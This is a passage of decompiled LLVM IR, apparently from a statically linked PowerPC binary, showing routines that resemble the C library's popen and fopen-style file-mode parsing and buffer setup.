  %v3_10004f3c = icmp eq i8 %v3_10004f2c, 114
  br i1 %v3_10004f3c, label %dec_label_pc_10004f6c, label %dec_label_pc_10004f4c

dec_label_pc_10004f4c:                            ; preds = %dec_label_pc_10004f3c
  %v0_10004f4c = call i32 @function_10004b48()
  %v2_10004f5c = inttoptr i32 %v0_10004f4c to i32*
  store i32 22, i32* %v2_10004f5c, align 4
  br label %dec_label_pc_1000512c

dec_label_pc_10004f64:                            ; preds = %dec_label_pc_10004f18
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004f6c

dec_label_pc_10004f6c:                            ; preds = %dec_label_pc_10004f3c, %dec_label_pc_10004f64
  %v0_10005034 = phi i32 [ 0, %dec_label_pc_10004f64 ], [ 1, %dec_label_pc_10004f3c ]
  store i32 ptrtoint ([3 x i8]* @global_var_10004f74.203 to i32), i32* @lr, align 4
  %v1_10004f70 = call i32 @function_10007cf0(i32 12)
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %v1_10004f70, i32* %r9.global-to-local, align 4
  %v3_10004f78 = icmp eq i32 %v1_10004f70, 0
  br i1 %v3_10004f78, label %dec_label_pc_1000512c, label %dec_label_pc_10004f88

dec_label_pc_10004f88:                            ; preds = %dec_label_pc_10004f6c
  %v2_10004f88 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10004f88, i32* %r29.global-to-local, align 4
  store i32 268455828, i32* @lr, align 4
  %v2_10004f90 = call i32 @function_100093d0(i32 %v2_10004f88, i32 %v1_10004f70)
  %v3_10004f94 = icmp eq i32 %v2_10004f90, 0
  br i1 %v3_10004f94, label %dec_label_pc_10004f9c, label %dec_label_pc_1000511c

dec_label_pc_10004f9c:                            ; preds = %dec_label_pc_10004f88
  store i32 %v0_10005034, i32* %r9.global-to-local, align 4
  %v0_10004fa0 = load i32, i32* @r31, align 4
  %tmp = sub nsw i32 0, %v0_10005034
  %v1_10004fa4 = and i32 %tmp, 4
  %v1_10004fa8 = xor i32 %v1_10004fa4, 4
  %v0_10004fac = load i32, i32* %r29.global-to-local, align 4
  %v2_10004fac = add i32 %v0_10004fac, %v1_10004fa8
  %v3_10004fac = inttoptr i32 %v2_10004fac to i32*
  %v4_10004fac = load i32, i32* %v3_10004fac, align 4
  %v2_10004fb8 = add i32 %v0_10004fac, %v1_10004fa4
  %v3_10004fb8 = inttoptr i32 %v2_10004fb8 to i32*
  %v4_10004fb8 = load i32, i32* %v3_10004fb8, align 4
  store i32 268455880, i32* @lr, align 4
  %v4_10004fc4 = call i32 @function_1000968c(i32 %v4_10004fac, i32 %v0_10004fa0, i32 %v0_10005034)
  %v3_10004fc8 = icmp eq i32 %v4_10004fc4, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10004fc8, label %dec_label_pc_10004fd4, label %dec_label_pc_10004fe8

dec_label_pc_10004fd4:                            ; preds = %dec_label_pc_10004f9c
  store i32 268455900, i32* @lr, align 4
  %v1_10004fd8 = call i32 @function_100048e0(i32 %v4_10004fac)
  store i32 ptrtoint (i32* @global_var_10004fe4.204 to i32), i32* @lr, align 4
  %v1_10004fe0 = call i32 @function_100048e0(i32 %v4_10004fb8)
  br label %dec_label_pc_1000511c

dec_label_pc_10004fe8:                            ; preds = %dec_label_pc_10004f9c
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.199 to i32), i32* %r29.global-to-local, align 4
  %v2_10004ffc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10004ffc, i32* @r3, align 4
  %v0_10005000 = call i32 @function_10008c84()
  %v0_10005008 = call i32 @function_10008c7c()
  store i32 %v0_10005008, i32* @r3, align 4
  store i32 268455952, i32* @lr, align 4
  %v1_1000500c = call i32 @function_10008fd4(i32 %v0_10005008)
  store i32 %v1_1000500c, i32* %r30.global-to-local, align 4
  %v3_10005010 = icmp eq i32 %v1_1000500c, 0
  %v0_10005014 = call i32 @__asm_mfcr()
  store i32 %v0_10005014, i32* %r29.global-to-local, align 4
  br i1 %v3_10005010, label %dec_label_pc_1000501c, label %dec_label_pc_1000509c

dec_label_pc_1000501c:                            ; preds = %dec_label_pc_10004fe8
  store i32 268455972, i32* @lr, align 4
  %v1_10005020 = call i32 @function_100048e0(i32 %v4_10004fac)
  store i32 %v0_10005034, i32* %r9.global-to-local, align 4
  %v4_1000502c = icmp eq i32 %v4_10004fb8, %v0_10005034
  br i1 %v4_1000502c, label %dec_label_pc_10005048, label %dec_label_pc_10005034

dec_label_pc_10005034:                            ; preds = %dec_label_pc_1000501c
  store i32 268456000, i32* @lr, align 4
  %v2_1000503c = call i32 @function_10009150(i32 %v4_10004fb8, i32 %v0_10005034)
  store i32 268456008, i32* @lr, align 4
  %v1_10005044 = call i32 @function_100048e0(i32 %v4_10004fb8)
  br label %dec_label_pc_10005048

dec_label_pc_10005048:                            ; preds = %dec_label_pc_1000501c, %dec_label_pc_10005034
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge1 = load i32, i32* @global_var_10010490.200, align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_100050644 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100050644, label %dec_label_pc_1000506c, label %dec_label_pc_10005054

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005048, %dec_label_pc_10005054
  %v0_10005054 = phi i32 [ %storemerge, %dec_label_pc_10005054 ], [ %storemerge1, %dec_label_pc_10005048 ]
  %v1_10005054 = add i32 %v0_10005054, 4
  %v2_10005054 = inttoptr i32 %v1_10005054 to i32*
  %v3_10005054 = load i32, i32* %v2_10005054, align 4
  store i32 %v3_10005054, i32* %r9.global-to-local, align 4
  %v1_10005058 = add i32 %v3_10005054, 4
  %v2_10005058 = inttoptr i32 %v1_10005058 to i32*
  %v3_10005058 = load i32, i32* %v2_10005058, align 4
  store i32 268456032, i32* @lr, align 4
  %v1_1000505c = call i32 @function_100048e0(i32 %v3_10005058)
  %v0_10005060 = load i32, i32* %r29.global-to-local, align 4
  %v1_10005060 = inttoptr i32 %v0_10005060 to i32*
  %storemerge = load i32, i32* %v1_10005060, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10005064 = icmp eq i32 %storemerge, 0
  br i1 %v3_10005064, label %dec_label_pc_1000506c, label %dec_label_pc_10005054

dec_label_pc_1000506c:                            ; preds = %dec_label_pc_10005054, %dec_label_pc_10005048
  %v8_10005090 = call i32 @function_100088e0(i32 ptrtoint ([8 x i8]* @global_var_1000e028.207 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e030.208 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e034.209 to i32), i32 %arg1, i32 0)
  %v1_10005098 = call i32 @function_10009114(i32 127)
  br label %dec_label_pc_1000509c

dec_label_pc_1000509c:                            ; preds = %dec_label_pc_10004fe8, %dec_label_pc_1000506c
  store i32 %v2_10004ffc, i32* @r3, align 4
  %v0_100050a8 = call i32 @function_10008c84()
  store i32 268456116, i32* @lr, align 4
  %v1_100050b0 = call i32 @function_100048e0(i32 %v4_10004fb8)
  %v0_100050b4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100050b4 = call %0 @__asm_mtcrf(i32 128, i32 %v0_100050b4)
  %v2_100050b4 = extractvalue %0 %v1_100050b4, 0
  %v4_100050b4 = extractvalue %0 %v1_100050b4, 2
  %v2_100050b8 = or i1 %v4_100050b4, %v2_100050b4
  br i1 %v2_100050b8, label %dec_label_pc_10005114, label %dec_label_pc_100050bc

dec_label_pc_100050bc:                            ; preds = %dec_label_pc_1000509c
  store i32 %v1_10004f70, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.199 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10004ffc, i32* @r3, align 4
  %v0_100050cc = load i32, i32* %r30.global-to-local, align 4
  %v2_100050cc = add i32 %v1_10004f70, 8
  %v3_100050cc = inttoptr i32 %v2_100050cc to i32*
  store i32 %v0_100050cc, i32* %v3_100050cc, align 4
  store i32 %v4_10004fc4, i32* %r11.global-to-local, align 4
  %v1_100050d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100050d8 = add i32 %v1_100050d8, 4
  %v3_100050d8 = inttoptr i32 %v2_100050d8 to i32*
  store i32 %v4_10004fc4, i32* %v3_100050d8, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_100050e4 = call i32 @function_10008c84()
  %v0_100050ec = call i32 @function_10008c7c()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100050f4 = load i32, i32* @global_var_10010490.200, align 4
  store i32 %v2_10004ffc, i32* @r3, align 4
  store i32 %v1_10004f70, i32* %r11.global-to-local, align 4
  %v2_10005104 = inttoptr i32 %v1_10004f70 to i32*
  store i32 %v3_100050f4, i32* %v2_10005104, align 4
  %v0_10005108 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10005108, i32* @global_var_10010490.200, align 4
  %v0_1000510c = call i32 @function_10008c84()
  br label %dec_label_pc_1000512c

dec_label_pc_10005114:                            ; preds = %dec_label_pc_1000509c
  store i32 268456220, i32* @lr, align 4
  %v1_10005118 = inttoptr i32 %v4_10004fc4 to i16*
  %v2_10005118 = call i32 @function_10004b54(i16* %v1_10005118)
  br label %dec_label_pc_1000511c

dec_label_pc_1000511c:                            ; preds = %dec_label_pc_10004f88, %dec_label_pc_10004fd4, %dec_label_pc_10005114
  store i32 ptrtoint (i32* @global_var_10005124.212 to i32), i32* @lr, align 4
  %v1_10005120 = call i32 @function_10007e48(i32 %v1_10004f70)
  br label %dec_label_pc_1000512c

dec_label_pc_1000512c:                            ; preds = %dec_label_pc_10004f6c, %dec_label_pc_100050bc, %dec_label_pc_10004f4c, %dec_label_pc_1000511c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10004f6c ], [ 0, %dec_label_pc_1000511c ], [ %v4_10004fc4, %dec_label_pc_100050bc ], [ 0, %dec_label_pc_10004f4c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v4_10004fc4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_10004fb8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_10004f70, { 4, 1, 0, 3, 2, 5, 6, 7 }
  uselistorder i32 %v0_10005034, { 1, 3, 2, 5, 0, 4 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 7, 8, 3, 4, 5, 6 }
  uselistorder i32* @global_var_10010490.200, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000512c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000511c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000509c, { 1, 0 }
  uselistorder label %dec_label_pc_10005054, { 1, 0 }
  uselistorder label %dec_label_pc_10005048, { 1, 0 }
  uselistorder label %dec_label_pc_10004f6c, { 1, 0 }
}

define i32 @function_10005144(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10005144:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10005144 = load i32, i32* @lr, align 4
  store i32 %v0_10005144, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10005158 = load i32, i32* @r5, align 4
  store i32 %v0_10005158, i32* @r31, align 4
  %v0_1000515c = load i32, i32* @r6, align 4
  store i32 %v0_1000515c, i32* @r29, align 4
  %v3_10005160 = load i8, i8* %arg2, align 1
  %v4_10005160 = zext i8 %v3_10005160 to i32
  store i32 %v4_10005160, i32* %r0.global-to-local, align 4
  %v3_10005164 = icmp eq i8 %v3_10005160, 114
  br i1 %v3_10005164, label %dec_label_pc_100051b0, label %dec_label_pc_1000516c

dec_label_pc_1000516c:                            ; preds = %dec_label_pc_10005144
  %v3_1000516c = icmp eq i8 %v3_10005160, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000516c, label %dec_label_pc_100051b4, label %dec_label_pc_10005178

dec_label_pc_10005178:                            ; preds = %dec_label_pc_1000516c
  %v3_10005178 = icmp eq i8 %v3_10005160, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10005178, label %dec_label_pc_100051b4, label %dec_label_pc_10005184

dec_label_pc_10005184:                            ; preds = %dec_label_pc_10005244, %dec_label_pc_10005214, %dec_label_pc_10005178
  %v0_10005184 = call i32 @function_10004b48()
  %v0_10005188 = load i32, i32* @r31, align 4
  %v3_10005188 = icmp eq i32 %v0_10005188, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10005190 = inttoptr i32 %v0_10005184 to i32*
  store i32 22, i32* %v2_10005190, align 4
  br i1 %v3_10005188, label %dec_label_pc_100053e4, label %dec_label_pc_10005198

dec_label_pc_10005198:                            ; preds = %dec_label_pc_10005278, %dec_label_pc_10005184
  %v0_10005198 = load i32, i32* @r31, align 4
  %v1_10005198 = inttoptr i32 %v0_10005198 to i16*
  %v2_10005198 = load i16, i16* %v1_10005198, align 2
  %v3_10005198 = zext i16 %v2_10005198 to i32
  store i32 %v3_10005198, i32* %r0.global-to-local, align 4
  %v1_1000519c = and i32 %v3_10005198, 8192
  store i32 %v1_1000519c, i32* %r9.global-to-local, align 4
  %v3_1000519c = icmp eq i32 %v1_1000519c, 0
  store i1 %v3_1000519c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000519c, label %dec_label_pc_100053e4, label %dec_label_pc_100051a4

dec_label_pc_100051a4:                            ; preds = %dec_label_pc_10005198
  store i32 ptrtoint (i32* @global_var_100051ac.213 to i32), i32* @lr, align 4
  %v2_100051a8 = call i32 @function_10007e48(i32 %v0_10005198)
  br label %dec_label_pc_100053e4

dec_label_pc_100051b0:                            ; preds = %dec_label_pc_10005144
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100051b4

dec_label_pc_100051b4:                            ; preds = %dec_label_pc_10005178, %dec_label_pc_1000516c, %dec_label_pc_100051b0
  %v0_100051d4 = phi i32 [ 1089, %dec_label_pc_10005178 ], [ 577, %dec_label_pc_1000516c ], [ 1, %dec_label_pc_100051b0 ]
  %v2_100051b4 = add i32 %tmp, 1
  %v3_100051b4 = inttoptr i32 %v2_100051b4 to i8*
  %v4_100051b4 = load i8, i8* %v3_100051b4, align 1
  %v5_100051b4 = zext i8 %v4_100051b4 to i32
  store i32 %v5_100051b4, i32* %r0.global-to-local, align 4
  %v3_100051bc = icmp eq i8 %v4_100051b4, 98
  br i1 %v3_100051bc, label %dec_label_pc_100051c8, label %dec_label_pc_100051c4

dec_label_pc_100051c4:                            ; preds = %dec_label_pc_100051b4
  br label %dec_label_pc_100051c8

dec_label_pc_100051c8:                            ; preds = %dec_label_pc_100051b4, %dec_label_pc_100051c4
  %storemerge = phi i32 [ %tmp, %dec_label_pc_100051c4 ], [ %v2_100051b4, %dec_label_pc_100051b4 ]
  %v0_100051c8 = phi i32 [ %tmp, %dec_label_pc_100051c4 ], [ %v2_100051b4, %dec_label_pc_100051b4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100051c8 = add i32 %v0_100051c8, 1
  %v2_100051c8 = inttoptr i32 %v1_100051c8 to i8*
  %v3_100051c8 = load i8, i8* %v2_100051c8, align 1
  %v4_100051c8 = zext i8 %v3_100051c8 to i32
  store i32 %v4_100051c8, i32* %r0.global-to-local, align 4
  %v3_100051cc = icmp eq i8 %v3_100051c8, 43
  br i1 %v3_100051cc, label %dec_label_pc_100051d4, label %dec_label_pc_100051dc

dec_label_pc_100051d4:                            ; preds = %dec_label_pc_100051c8
  store i32 %v0_100051d4, i32* %r9.global-to-local, align 4
  %v1_100051d8 = add nuw nsw i32 %v0_100051d4, 1
  store i32 %v1_100051d8, i32* @r28, align 4
  br label %dec_label_pc_100051dc

dec_label_pc_100051dc:                            ; preds = %dec_label_pc_100051c8, %dec_label_pc_100051d4
  %v3_100051dc = icmp eq i32 %v0_10005158, 0
  br i1 %v3_100051dc, label %dec_label_pc_100051e4, label %dec_label_pc_1000520c

dec_label_pc_100051e4:                            ; preds = %dec_label_pc_100051dc
  store i32 268456428, i32* @lr, align 4
  %v1_100051e8 = call i32 @function_10007cf0(i32 80)
  store i32 %v1_100051e8, i32* @r31, align 4
  %v4_100051ec = icmp eq i32 %v1_100051e8, 0
  store i1 %v4_100051ec, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_100051ec, label %dec_label_pc_100053e8, label %dec_label_pc_100051f4

dec_label_pc_100051f4:                            ; preds = %dec_label_pc_100051e4
  %v1_100051f8 = add i32 %v1_100051e8, 56
  store i32 %v1_100051f8, i32* @r3, align 4
  %v3_100051fc = inttoptr i32 %v1_100051e8 to i16*
  store i16 8192, i16* %v3_100051fc, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10005204 = load i32, i32* @r31, align 4
  %v2_10005204 = add i32 %v1_10005204, 8
  %v3_10005204 = inttoptr i32 %v2_10005204 to i32*
  store i32 0, i32* %v3_10005204, align 4
  store i32 268456460, i32* @lr, align 4
  %v0_10005208 = call i32 @function_10005474()
  %v0_1000520c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000520c

dec_label_pc_1000520c:                            ; preds = %dec_label_pc_100051dc, %dec_label_pc_100051f4
  %v0_1000526c = phi i32 [ %v0_1000515c, %dec_label_pc_100051dc ], [ %v0_1000520c.pre, %dec_label_pc_100051f4 ]
  %v1_1000520c = icmp slt i32 %v0_1000526c, 0
  br i1 %v1_1000520c, label %dec_label_pc_1000526c, label %dec_label_pc_10005214

dec_label_pc_10005214:                            ; preds = %dec_label_pc_1000520c
  %v1_10005218 = add i32 %arg1, 1
  store i32 %v1_10005218, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_10005220 = load i32, i32* @r31, align 4
  %v2_10005220 = add i32 %v1_10005220, 4
  %v3_10005220 = inttoptr i32 %v2_10005220 to i32*
  store i32 %v0_1000526c, i32* %v3_10005220, align 4
  %v0_10005224 = load i32, i32* @r28, align 4
  %v1_10005224 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005224 = and i32 %v1_10005224, %v0_10005224
  %v1_10005228 = add i32 %v2_10005224, 1
  store i32 %v1_10005228, i32* %r9.global-to-local, align 4
  %v1_1000522c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000522c = and i32 %v1_1000522c, %v1_10005228
  store i32 %v2_1000522c, i32* %r0.global-to-local, align 4
  %v4_10005230 = icmp eq i32 %v2_1000522c, %v1_10005228
  br i1 %v4_10005230, label %dec_label_pc_10005238, label %dec_label_pc_10005184

dec_label_pc_10005238:                            ; preds = %dec_label_pc_10005214
  %v2_10005238 = sub i32 -1, %arg1
  %v3_10005238 = and i32 %v0_10005224, %v2_10005238
  store i32 %v3_10005238, i32* %r0.global-to-local, align 4
  %v1_1000523c = and i32 %v3_10005238, 1024
  store i32 %v1_1000523c, i32* %r9.global-to-local, align 4
  %v3_1000523c = icmp eq i32 %v1_1000523c, 0
  store i1 %v3_1000523c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000523c, label %dec_label_pc_10005260, label %dec_label_pc_10005244

dec_label_pc_10005244:                            ; preds = %dec_label_pc_10005238
  %v0_10005244 = load i32, i32* @r29, align 4
  store i32 268456536, i32* @lr, align 4
  %v2_10005254 = call i32 @function_1000902c(i32 %v0_10005244, i32 4)
  %v3_10005258 = icmp eq i32 %v2_10005254, 0
  br i1 %v3_10005258, label %dec_label_pc_10005260, label %dec_label_pc_10005184

dec_label_pc_10005260:                            ; preds = %dec_label_pc_10005244, %dec_label_pc_10005238
  %v1_10005260 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10005260, i32* %r0.global-to-local, align 4
  %v0_10005264 = load i32, i32* @r28, align 4
  %v2_10005264 = or i32 %v0_10005264, %v1_10005260
  store i32 %v2_10005264, i32* @r28, align 4
  br label %dec_label_pc_10005298

dec_label_pc_1000526c:                            ; preds = %dec_label_pc_1000520c
  %v3_1000526c = icmp eq i32 %v0_1000526c, -1
  %v0_1000527c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000526c, label %dec_label_pc_10005278, label %dec_label_pc_10005274

dec_label_pc_10005274:                            ; preds = %dec_label_pc_1000526c
  %v1_10005274 = or i32 %v0_1000527c.pre, 65536
  store i32 %v1_10005274, i32* @r28, align 4
  br label %dec_label_pc_10005278

dec_label_pc_10005278:                            ; preds = %dec_label_pc_1000526c, %dec_label_pc_10005274
  %v0_1000527c = phi i32 [ %v1_10005274, %dec_label_pc_10005274 ], [ %v0_1000527c.pre, %dec_label_pc_1000526c ]
  store i32 438, i32* @r5, align 4
  store i32 268456588, i32* @lr, align 4
  %v2_10005288 = call i32 @function_10009348(i32 %arg1, i32 %v0_1000527c)
  %v1_1000528c = icmp slt i32 %v2_10005288, 0
  %v1_10005290 = load i32, i32* @r31, align 4
  %v2_10005290 = add i32 %v1_10005290, 4
  %v3_10005290 = inttoptr i32 %v2_10005290 to i32*
  store i32 %v2_10005288, i32* %v3_10005290, align 4
  br i1 %v1_1000528c, label %dec_label_pc_10005198, label %dec_label_pc_10005278.dec_label_pc_10005298_crit_edge

dec_label_pc_10005278.dec_label_pc_10005298_crit_edge: ; preds = %dec_label_pc_10005278
  %v0_1000529c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10005298

dec_label_pc_10005298:                            ; preds = %dec_label_pc_10005278.dec_label_pc_10005298_crit_edge, %dec_label_pc_10005260
  %v0_1000529c = phi i32 [ %v0_1000529c.pre, %dec_label_pc_10005278.dec_label_pc_10005298_crit_edge ], [ %v2_10005264, %dec_label_pc_10005260 ]
  %v0_10005298 = load i32, i32* @r31, align 4
  %v1_10005298 = inttoptr i32 %v0_10005298 to i16*
  %v2_10005298 = load i16, i16* %v1_10005298, align 2
  %v3_10005298 = zext i16 %v2_10005298 to i32
  store i32 %v3_10005298, i32* %r0.global-to-local, align 4
  %v1_1000529c = urem i32 %v0_1000529c, 4
  store i32 %v1_1000529c, i32* %r29.global-to-local, align 4
  %v1_100052a0 = call i32 @__asm_rlwinm(i32 %v0_1000529c, i32 0, i32 21, i32 21)
  %v1_100052a4 = add nuw nsw i32 %v1_1000529c, 1
  store i32 %v1_100052a4, i32* %r29.global-to-local, align 4
  %v1_100052a8 = call i32 @__asm_rlwinm(i32 %v3_10005298, i32 0, i32 18, i32 18)
  store i32 %v1_100052a8, i32* %r0.global-to-local, align 4
  %v1_100052ac = xor i32 %v1_100052a4, 3
  store i32 %v1_100052ac, i32* %r29.global-to-local, align 4
  %v1_100052b0 = urem i32 %v1_100052a8, 65536
  store i32 %v1_100052b0, i32* %r9.global-to-local, align 4
  %v0_100052b4 = load i32, i32* @r28, align 4
  %v1_100052b4 = call i32 @__asm_rlwinm(i32 %v0_100052b4, i32 31, i32 16, i32 16)
  %v2_100052b8 = or i32 %v1_100052b4, %v1_100052a0
  store i32 %v2_100052b8, i32* %r0.global-to-local, align 4
  %v0_100052bc = load i32, i32* %r29.global-to-local, align 4
  %v1_100052bc = mul i32 %v0_100052bc, 16
  %v0_100052c0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100052c0 = or i32 %v0_100052c0, %v2_100052b8
  store i32 %v2_100052c0, i32* %r9.global-to-local, align 4
  %v2_100052c4 = or i32 %v2_100052c0, %v1_100052bc
  store i32 %v2_100052c4, i32* @r29, align 4
  %v1_100052c8 = trunc i32 %v2_100052c4 to i16
  %v2_100052c8 = load i32, i32* @r31, align 4
  %v3_100052c8 = inttoptr i32 %v2_100052c8 to i16*
  store i16 %v1_100052c8, i16* %v3_100052c8, align 2
  %v0_100052cc = call i32 @function_10004b48()
  store i32 %v0_100052cc, i32* @r28, align 4
  %v0_100052d4 = load i32, i32* @r31, align 4
  %v1_100052d4 = add i32 %v0_100052d4, 4
  %v2_100052d4 = inttoptr i32 %v1_100052d4 to i32*
  %v3_100052d4 = load i32, i32* %v2_100052d4, align 4
  %v1_100052d8 = inttoptr i32 %v0_100052cc to i32*
  %v2_100052d8 = load i32, i32* %v1_100052d8, align 4
  store i32 %v2_100052d8, i32* @r27, align 4
  store i32 268456672, i32* @lr, align 4
  %v1_100052dc = call i32 @function_1000740c(i32 %v3_100052d4)
  %v1_100052e0 = mul i32 %v1_100052dc, 256
  %v0_100052e4 = load i32, i32* @r29, align 4
  %v2_100052e4 = or i32 %v0_100052e4, %v1_100052e0
  store i32 %v2_100052e4, i32* @r29, align 4
  %v1_100052e8 = trunc i32 %v2_100052e4 to i16
  %v2_100052e8 = load i32, i32* @r31, align 4
  %v3_100052e8 = inttoptr i32 %v2_100052e8 to i16*
  store i16 %v1_100052e8, i16* %v3_100052e8, align 2
  %v0_100052ec = load i32, i32* @r27, align 4
  %v1_100052ec = load i32, i32* @r28, align 4
  %v2_100052ec = inttoptr i32 %v1_100052ec to i32*
  store i32 %v0_100052ec, i32* %v2_100052ec, align 4
  %v0_100052f0 = load i32, i32* @r31, align 4
  %v1_100052f0 = add i32 %v0_100052f0, 8
  %v2_100052f0 = inttoptr i32 %v1_100052f0 to i32*
  %v3_100052f0 = load i32, i32* %v2_100052f0, align 4
  store i32 %v3_100052f0, i32* %r0.global-to-local, align 4
  %v3_100052f4 = icmp eq i32 %v3_100052f0, 0
  br i1 %v3_100052f4, label %dec_label_pc_100052fc, label %dec_label_pc_1000532c

dec_label_pc_100052fc:                            ; preds = %dec_label_pc_10005298
  store i32 268456708, i32* @lr, align 4
  %v1_10005300 = call i32 @function_10007cf0(i32 4096)
  %v3_10005304 = icmp eq i32 %v1_10005300, 0
  %v1_10005308 = load i32, i32* @r31, align 4
  %v2_10005308 = add i32 %v1_10005308, 8
  %v3_10005308 = inttoptr i32 %v2_10005308 to i32*
  store i32 %v1_10005300, i32* %v3_10005308, align 4
  %v1_10005328 = load i32, i32* @r31, align 4
  br i1 %v3_10005304, label %dec_label_pc_10005328, label %dec_label_pc_10005310

dec_label_pc_10005310:                            ; preds = %dec_label_pc_100052fc
  %v1_10005310 = inttoptr i32 %v1_10005328 to i16*
  %v2_10005310 = load i16, i16* %v1_10005310, align 2
  %v3_10005310 = zext i16 %v2_10005310 to i32
  store i32 %v3_10005310, i32* %r0.global-to-local, align 4
  %v1_10005314 = add i32 %v1_10005300, 4096
  store i32 %v1_10005314, i32* %r9.global-to-local, align 4
  %v2_10005318 = add i32 %v1_10005328, 12
  %v3_10005318 = inttoptr i32 %v2_10005318 to i32*
  store i32 %v1_10005314, i32* %v3_10005318, align 4
  %v0_1000531c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000531c = or i32 %v0_1000531c, 16384
  store i32 %v1_1000531c, i32* %r0.global-to-local, align 4
  %v1_10005320 = trunc i32 %v1_1000531c to i16
  %v2_10005320 = load i32, i32* @r31, align 4
  %v3_10005320 = inttoptr i32 %v2_10005320 to i16*
  store i16 %v1_10005320, i16* %v3_10005320, align 2
  br label %dec_label_pc_1000532c

dec_label_pc_10005328:                            ; preds = %dec_label_pc_100052fc
  %v2_10005328 = add i32 %v1_10005328, 12
  %v3_10005328 = inttoptr i32 %v2_10005328 to i32*
  store i32 0, i32* %v3_10005328, align 4
  br label %dec_label_pc_1000532c

dec_label_pc_1000532c:                            ; preds = %dec_label_pc_10005298, %dec_label_pc_10005310, %dec_label_pc_10005328
  %v0_1000532c = load i32, i32* @r31, align 4
  %v1_1000532c = inttoptr i32 %v0_1000532c to i16*
  %v2_1000532c = load i16, i16* %v1_1000532c, align 2
  %v3_1000532c = zext i16 %v2_1000532c to i32
  store i32 %v3_1000532c, i32* %r0.global-to-local, align 4
  %v1_10005330 = add i32 %v0_1000532c, 8
  %v2_10005330 = inttoptr i32 %v1_10005330 to i32*
  %v3_10005330 = load i32, i32* %v2_10005330, align 4
  store i32 %v3_10005330, i32* %r9.global-to-local, align 4
  %v1_10005334 = and i32 %v3_1000532c, 8192
  %v3_10005334 = icmp eq i32 %v1_10005334, 0
  store i1 %v3_10005334, i1* %cr0_eq.global-to-local, align 1
  %v3_1000533c = add i32 %v0_1000532c, 2
  %v4_1000533c = inttoptr i32 %v3_1000533c to i8*
  store i8 0, i8* %v4_1000533c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10005344 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005344 = load i32, i32* @r31, align 4
  %v2_10005344 = add i32 %v1_10005344, 20
  %v3_10005344 = inttoptr i32 %v2_10005344 to i32*
  store i32 %v0_10005344, i32* %v3_10005344, align 4
  %v0_10005348 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005348 = load i32, i32* @r31, align 4
  %v2_10005348 = add i32 %v1_10005348, 24
  %v3_10005348 = inttoptr i32 %v2_10005348 to i32*
  store i32 %v0_10005348, i32* %v3_10005348, align 4
  %v0_1000534c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000534c = load i32, i32* @r31, align 4
  %v2_1000534c = add i32 %v1_1000534c, 28
  %v3_1000534c = inttoptr i32 %v2_1000534c to i32*
  store i32 %v0_1000534c, i32* %v3_1000534c, align 4
  %v0_10005350 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005350 = load i32, i32* @r31, align 4
  %v2_10005350 = add i32 %v1_10005350, 16
  %v3_10005350 = inttoptr i32 %v2_10005350 to i32*
